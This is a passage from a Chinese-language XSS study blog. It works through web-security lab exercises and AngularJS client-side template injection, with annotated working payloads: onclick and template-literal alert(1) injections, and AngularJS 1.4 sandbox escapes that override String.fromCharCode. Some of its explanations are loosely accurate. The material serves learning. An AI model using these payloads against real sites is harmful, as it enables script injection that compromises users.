<li><code>,window%2b%27%27</code>：将window对象强制转换为字符串。</li>
<li><code>&#123;x:%27</code>：创建一个名为x的对象，然后将其设置为一个字符串。</li>
</ol></li>
</ol></li>
<li><p><strong>lab:Stored XSS into <code>onclick</code> event with angle
brackets and double quotes HTML-encoded and single quotes and backslash
escaped</strong></p>
<p><strong>html实体编码</strong></p>
<ol type="1">
<li><p>评论试探：website输入框会被反射</p></li>
<li><p>payload:</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>foo<span class="token operator">?</span><span class="token operator">&amp;</span>apos<span class="token punctuation">;</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&amp;</span>apos<span class="token punctuation">;</span></code></pre>
<figure>
<img src="https://s2.loli.net/2023/04/17/G2ICxEhZt81jofU.png"
alt="image-20230417124325986" />
<figcaption aria-hidden="true">image-20230417124325986</figcaption>
</figure></li>
<li><p>注意在Burp中关键词url编码</p></li>
</ol></li>
<li><p><strong>Lab: Reflected XSS into a template literal with angle
brackets, single, double quotes, backslash and backticks
Unicode-escaped</strong></p>
<p><strong>JavaScript模板字符串</strong>是一种字符串字面量，它允许嵌入JavaScript表达式。嵌入的表达式将被计算并且通常会被连接到周围的文本中。模板字符串用反引号而不是常规引号括起来，并且使用${...}语法来标识嵌入的表达式。<strong>不需要</strong>使用闭合标签，因为模板字符串本身已经提供了一个安全的JavaScript执行环境。</p>
<p>例如，以下脚本将打印一个包含用户显示名称的欢迎消息：注意<strong>反引号</strong></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Welcome, </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>user<span class="token punctuation">.</span>displayName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code></pre>
<ol type="1">
<li><p>payload试探：反引号说明使用了JS模板字符串<img
src="https://s2.loli.net/2023/04/17/ogEdr9Z4YmxVz7G.png"
alt="image-20230417144538422" /></p></li>
<li><p>最终payload</p>
<pre class="language-JS" data-language="JS"><code class="language-JS">$&#123;alert(1)&#125;</code></pre></li>
</ol></li>
</ul>
<h4 id="client-side-template-injection-1">Client-side template
injection</h4>
<ul>
<li><p><a target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/1/">资源网站</a><img
src="https://s2.loli.net/2023/04/17/eOPlALfSkbQpu4n.png"
alt="image-20230417151700777" /></p></li>
<li><p><strong>XSS without HTML: Client-Side Template Injection with
AngularJS</strong></p>
<p><code>Angular模板</code>可以包含表达式——双大括号内的类似于JavaScript的代码片段。以下jsfiddle展示了它们的工作原理：</p>
<p>文本输入2会由Angular计算，然后显示输出：2。</p>
<ol type="1">
<li><p>以下两个片段展示了漏洞的本质。第一个页面动态嵌入用户输入，但不会受到XSS的影响，因为它使用htmlspecialchars来对输入进行HTML编码：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>
    <span class="token prolog">&lt;?php
$q = $_GET['q'];
echo htmlspecialchars($q,ENT_QUOTES);
?></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li>
<li><p>第二个页面几乎相同，但是使用了Angular导入，这意味着它可以被注入Angular表达式，并且通过沙盒逃逸可以进行XSS攻击：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>
    <span class="token prolog">&lt;?php
$q = $_GET['q'];
echo htmlspecialchars($q,ENT_QUOTES);?></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>请注意，在DOM树中，你需要将"ng-app"放在表达式上面。通常，一个Angular站点会将其放在根HTML或body标签中。</p>
<p>换句话说，如果一个页面是Angular模板，我们将更容易进行XSS攻击。只有一个限制——沙盒。</p>
<p><strong>sandbox</strong>:</p>
<p>在计算机安全领域，sandbox（沙箱）是一种<strong>隔离机制</strong>，可以在不影响主机环境的情况下运行不受信任的程序或代码。沙箱通常用于执行不信任的代码，以防止恶意代码对系统的破坏或窃取敏感信息。</p>
<p>在Web开发中，sandbox通常是指<strong>浏览器的沙箱机制</strong>。浏览器沙箱将JavaScript代码限制在其运行的环境中，以防止它们访问本地文件系统、网络或其他敏感资源。此外，浏览器沙箱还可以限制脚本运行的权限和资源消耗，以保护用户不受恶意代码攻击的影响。</p>
<p>在AngularJS中，<strong>$sce服务提供了一个沙箱机制</strong>，可以在执行表达式之前将表达式的值进行安全检查和限制，从而保护应用程序免受XSS攻击的威胁。</p>
<p><span
class="math inline">\(sce服务提供了一组安全检查函数，例如`\)</span>sce.parseAsHtml<code>和</code>$sce.parseAsUrl`，它们可以用于解析和转义表达式的值，以确保它们不会包含任何不安全的内容。</p>
<p>在AngularJS中，<code>$sce</code>是一个服务，它提供了一种安全的方式来在应用程序中使用HTML、CSS和URL。</p>
<p><code>$sce</code>代表"Strict Contextual
Escaping"（严格上下文转义），其目的是确保当AngularJS应用程序渲染动态内容时，这些内容不会包含任何恶意代码或脚本，以避免跨站脚本攻击（XSS）。$sce服务提供了三个方法：trustAs()、getTrusted()和parseAs()，用于将动态数据标记为安全内容并在应用程序中使用。</p>
<p>trustAs()方法用于标记动态数据作为可信任内容，并返回一个被标记的对象。例如，通过$sce.trustAsHtml()方法可以将HTML字符串标记为可信任的HTML内容。getTrusted()方法用于获取被标记为可信任内容的对象的原始值。parseAs()方法用于将一个字符串解析为指定类型的可信任值，例如，将URL字符串解析为可信任的URL值。</p>
<p>AngularJS 中的 <code>ensureSafeMemberName</code> 和
<code>ensureSafeFunction</code>
函数都是用来保证表达式求值的安全性，防止恶意代码注入的一种重要机制。下面分别解释这两个函数的原理：</p>
<ul>
<li><code>ensureSafeMemberName</code>
函数的作用是检查表达式中的属性名称是否合法，防止通过构造出非法的属性名称来执行恶意操作。在检查过程中，该函数会使用正则表达式匹配合法的属性名称，同时也会检查是否包含
JavaScript 对象的原型属性，如
<code>__proto__</code>、<code>__defineGetter__</code>
等，防止通过修改原型链来攻击。</li>
<li><code>ensureSafeFunction</code>
函数的作用是检查函数调用是否安全，防止恶意代码注入。在检查过程中，该函数会检查调用函数的构造函数是否为
<code>Function</code>，如果是则说明在调用该函数时使用了 <code>new</code>
操作符，如果不是则说明调用的函数本身就是一个安全的函数。另外，该函数还会检查函数调用的方式是否为
<code>call</code>、<code>apply</code> 或 <code>bind</code>
方法调用，因为这些方法可以将函数的 <code>this</code>
上下文绑定到非安全的对象上，导致安全问题。如果检查通过，则返回安全的函数对象；否则，抛出错误信息。</li>
</ul></li>
<li><p><strong>ng-bind-html</strong> 是 AngularJS
框架中的一个指令，它用于将 HTML
内容绑定到元素上。通过使用这个指令，可以将一个包含 HTML
代码的字符串绑定到元素上，从而将这些 HTML 代码渲染为 DOM
元素，并将其插入到文档中。</p>
<p>例如，可以在一个 div 元素上使用 ng-bind-html 指令，将一个包含 HTML
代码的字符串绑定到该元素上：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-bind-html</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>htmlContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre>
<p>在这个例子中，htmlContent 是一个包含 HTML 代码的字符串，它会被渲染为
DOM 元素，并插入到 div 元素中。需要注意的是，由于安全原因，AngularJS
会自动将 HTML 代码中的某些元素和属性过滤掉，以避免 XSS
攻击。如果想要允许某些元素或属性，则需要使用 $sce
服务来进行白名单配置。</p>
<p><strong>DOM (Document Object Model) 树</strong>指的是浏览器在解析
HTML 文档时所生成的一棵树状结构。在这个结构中，每个 HTML
标签都是一个节点，节点之间存在着父子关系，例如一个
<code>&lt;body&gt;</code> 标签是 <code>&lt;html&gt;</code>
标签的子节点，它本身也可以拥有子节点，比如 <code>&lt;p&gt;</code>
标签、<code>&lt;h1&gt;</code> 标签等。整个 HTML
文档可以被表示成一棵树，这个树状结构中的每个节点都可以被访问和操作。</p>
<p>通过操作 DOM 树，开发人员可以在浏览器中动态地改变 HTML
页面的内容，例如添加、修改或删除元素、修改元素属性、以及添加或移除事件监听器等。这种操作使得
Web 开发变得更加灵活和动态，能够实现更多的功能。</p>
<hr /></li>
</ol></li>
</ul>
<p>​
<strong>注：</strong>当我学到这的时候，我觉得很有必要认真学习web、学习JS</p>
<ul>
<li><p><strong>Corrupting the sanitizer</strong></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>
    &#123;&#123;
    'a'.constructor.fromCharCode=[].join;
    'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';
    &#125;&#125;
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p><strong>解析：</strong></p>
<p>这段代码是一个简单的 HTML 页面，其中包含了 AngularJS
库。在页面中，通过 Angular 表达式进行了一些操作，以尝试修改
<code>String.fromCharCode</code> 函数的行为。</p>
<p>在 Angular 表达式中，将 <code>String.fromCharCode</code>
函数重新定义为一个空数组的 <code>join</code> 方法。然后，将
<code>String</code> 构造函数的索引为 0 的属性值设置为
<code>&lt;iframe onload=alert(/Backdoored/)&gt;</code>，即一个带有恶意代码的
iframe 元素。</p>
<p>接着，在页面的 <code>&lt;script&gt;</code>
标签中，当页面加载完成时，调用了 <code>String.fromCharCode(97)</code>
函数，并将其结果使用 <code>document.write</code> 方法输出到页面上。</p>
<p>由于在 Angular 表达式中修改了 <code>String.fromCharCode</code>
函数的行为，所以无论实际传入的参数是什么，最终都会输出
<code>&lt;iframe onload=alert(/Backdoored/)&gt;</code>。这就演示了如何通过这种方式在
Angular 环境中实现一个后门攻击。</p></li>
<li><p>Code</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>
    &#123;&#123;
    'a'.constructor.prototype.charCodeAt=[].concat
    &#125;&#125;
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p><strong>解析：</strong></p>
<p>这段代码是一个示例，它展示了一个潜在的安全漏洞。它利用了 AngularJS
中的一个问题来演示如何覆盖 <code>charCodeAt</code>
函数以实现代码注入。</p>
<p>在这个示例中，使用了 AngularJS 1.4.6 版本，并在 <code>ng-app</code>
的作用域内使用了双花括号 <code>&#123;&#123;&#125;&#125;</code>
进行表达式求值。在这里，通过修改
<code>'a'.constructor.prototype.charCodeAt</code> 的值为
<code>[].concat</code>，覆盖了原生的 <code>charCodeAt</code> 函数。</p>
<p>当页面加载完成后，会调用 <code>onload</code> 函数，其中使用
<code>alert</code> 显示了 <code>'abc'.charCodeAt(0)</code>
的结果。正常情况下，该结果应为 <code>'97'</code>，即字母 a 的 ASCII
值。但由于我们在前面的代码中修改了 <code>charCodeAt</code>
函数，它现在返回的是基础字符串 <code>'abc'</code> 和参数 <code>0</code>
连接在一起的结果。</p></li>
<li><p>Code</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>validAttrs<span class="token punctuation">[</span>lkey<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>uriAttrs<span class="token punctuation">[</span>lkey<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean">true</span> <span class="token operator">||</span> <span class="token function">uriValidator</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> isImage<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">out</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">out</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">out</span><span class="token punctuation">(</span><span class="token string">'="'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">out</span><span class="token punctuation">(</span><span class="token function">encodeEntities</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">out</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p><strong>解析</strong>:</p>
<p>这段代码是一个条件语句，用于处理属性值的安全过滤和输出:</p>
<ol type="1">
<li><p><code>validAttrs[lkey] === true</code>:
这个条件检查属性是否是一个有效的属性。如果属性是有效的，继续进行后续处理。</p></li>
<li><p><code>(uriAttrs[lkey] !== true || uriValidator(value, isImage))</code>:
这个条件检查属性是否是一个 URI 属性，并且通过了 URI
验证。<code>uriAttrs</code> 是一个包含 URI 属性的列表，如果属性不是 URI
属性，或者属性的值通过了 URI 验证器 <code>uriValidator</code>
的验证，继续进行后续处理。</p></li>
<li><p><code>out(' ');</code>: 这行代码将一个空格字符输出。</p></li>
<li><p><code>out(key);</code>: 这行代码将属性名输出。</p></li>
<li><p><code>out('="');</code>:
这行代码将等号和双引号输出，用于开始属性值的引用。</p></li>
<li><p><code>out(encodeEntities(value));</code>: 这行代码调用
<code>encodeEntities</code>
函数对属性值进行编码，确保输出的属性值是安全的。</p></li>
<li><p><code>out('"');</code>: 这行代码输出属性值结束的双引号。</p></li>
</ol>
<p>综合起来，这段代码的作用是对属性值进行安全过滤，并将过滤后的属性名和属性值输出。如果属性是有效的且通过了
URI 验证（或不是 URI
属性），则会将属性名和编码后的属性值输出，确保输出的字符串是安全的。</p></li>
<li><p>Code</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">encodeEntities</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> value<span class="token punctuation">.</span>
    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token constant">SURROGATE_PAIR_REGEXP</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">var</span> hi <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> low <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token string">'&amp;#'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hi <span class="token operator">-</span> <span class="token number">0xD800</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>low <span class="token operator">-</span> <span class="token number">0xDC00</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token constant">NON_ALPHANUMERIC_REGEXP</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">'&amp;#'</span> <span class="token operator">+</span> value<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;gt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </code></pre>
<p><strong>解析：</strong></p>
<p>在给定的代码中，<code>encodeEntities</code> 函数用于对字符串值进行
HTML 实体编码，以确保在输出到 HTML
文档中时，特殊字符被正确地表示而不会被误解释。</p>
<p>函数中的步骤如下：</p>
<ol type="1">
<li>使用正则表达式 <code>/&amp;/g</code> 替换字符串中的
<code>&amp;</code> 符号为 <code>&amp;amp;</code>，以避免其被解释为 HTML
实体的起始标记。</li>
<li>使用 <code>SURROGATE_PAIR_REGEXP</code>
正则表达式进行匹配和替换，该正则表达式用于处理 Unicode
代理对字符。它将两个代理对字符转换为对应的 Unicode
实体编码，以确保它们被正确地表示。</li>
<li>使用 <code>NON_ALPHANUMERIC_REGEXP</code>
正则表达式进行匹配和替换，该正则表达式用于处理非字母数字字符。它将非字母数字字符转换为对应的
Unicode 实体编码，以确保它们被正确地表示。</li>
<li>使用 <code>/&amp;lt;/g</code> 正则表达式替换字符串中的
<code>&lt;</code> 符号为
<code>&amp;lt;</code>，以确保其被正确地表示而不会被解释为 HTML
标签的起始符号。</li>
<li>使用 <code>/&amp;gt;/g</code> 正则表达式替换字符串中的
<code>&gt;</code> 符号为
<code>&amp;gt;</code>，以确保其被正确地表示而不会被解释为 HTML
标签的结束符号。</li>
</ol>
<p>在给定的代码中，<code>replace(SURROGATE_PAIR_REGEXP, ...)</code>
表示使用正则表达式 <code>SURROGATE_PAIR_REGEXP</code>
进行匹配和替换操作。该正则表达式用于处理 Unicode 代理对字符。</p>
<p>Unicode 代理对字符是一种特殊的字符表示形式，由两个 Unicode
代理对组成。在 JavaScript
中，一个代理对字符被编码为两个字符的序列，称为高位（high
surrogate）和低位（low
surrogate）。为了正确地表示这些字符，需要将它们转换为对应的 Unicode
实体编码。</p>
<p>在 <code>replace(SURROGATE_PAIR_REGEXP, ...)</code>
的回调函数中，它获取匹配到的代理对字符，并将其转换为相应的 Unicode
实体编码。具体的步骤如下：</p>
<ol type="1">
<li><code>value.charCodeAt(0)</code> 获取代理对字符的高位字符的 Unicode
编码。</li>
<li><code>value.charCodeAt(1)</code> 获取代理对字符的低位字符的 Unicode
编码。</li>
<li><code>hi - 0xD800</code> 计算高位字符编码与高位字符的起始编码
<code>0xD800</code> 的差值。</li>
<li><code>low - 0xDC00</code> 计算低位字符编码与低位字符的起始编码
<code>0xDC00</code> 的差值。</li>
<li><code>((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000</code>
将差值乘以 <code>0x400</code> 并加上
<code>0x10000</code>，得到代理对字符的 Unicode 码点。</li>
<li><code>'&amp;#' + (((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000) + ';'</code>
将 Unicode 码点转换为形如 <code>&amp;#&lt;code&gt;;'</code>
的实体编码形式。</li>
</ol>
<p>通过这个过程，Unicode 代理对字符会被正确地转换为对应的 Unicode
实体编码，以确保在输出到 HTML 中时能够正确地表示这些特殊字符。</p></li>
<li><p>Code</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>
    &#123;&#123;
    'a'.constructor.fromCharCode=[].join;
    'a'.constructor[0]='",alert(1),"';
    $eval('"\\u0061"')+''
    &#125;&#125;
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p><strong>解析</strong>：</p>
<p>这段代码使用了 Angular 框架，并利用了
<code>String.fromCharCode</code>
的一个特性来注入恶意代码。让我逐步解释一下代码的原理：</p>
<ol type="1">
<li><p><code>'a'.constructor.fromCharCode=[].join;</code> 这行代码将
<code>fromCharCode</code> 函数重写为数组的 <code>join</code>
函数，这样当 <code>fromCharCode</code> 被调用时，它实际上执行的是数组的
<code>join</code> 函数而不是原始的字符串转码函数。</p></li>
<li><p><code>'a'.constructor[0]='",alert(1),"';</code>
这行代码将字符串构造函数的索引 0 处的值修改为
<code>",alert(1),"</code>，这样在使用字符串构造函数创建字符串时，它的首字母将被替换为恶意代码。</p></li>
<li><p><code>$eval('"\\u0061"')+''</code> 这行代码使用 Angular 的
<code>$eval</code> 函数执行字符串表达式 <code>"\\u0061"</code>，它表示
Unicode 编码为 <code>\u0061</code> 的字符
<code>'a'</code>。由于之前修改了字符串构造函数，此处的 <code>'a'</code>
实际上是带有恶意代码的字符串。然后通过字符串连接操作
<code>+''</code>，将其转换为字符串并输出。</p></li>
</ol>
<p>综合上述步骤，通过篡改 <code>fromCharCode</code>
函数和字符串构造函数，恶意代码 <code>",alert(1),"</code>
被注入并成功执行。在这个特定的例子中，<code>alert(1)</code>
将显示一个警示框，内容为数字 1。</p></li>
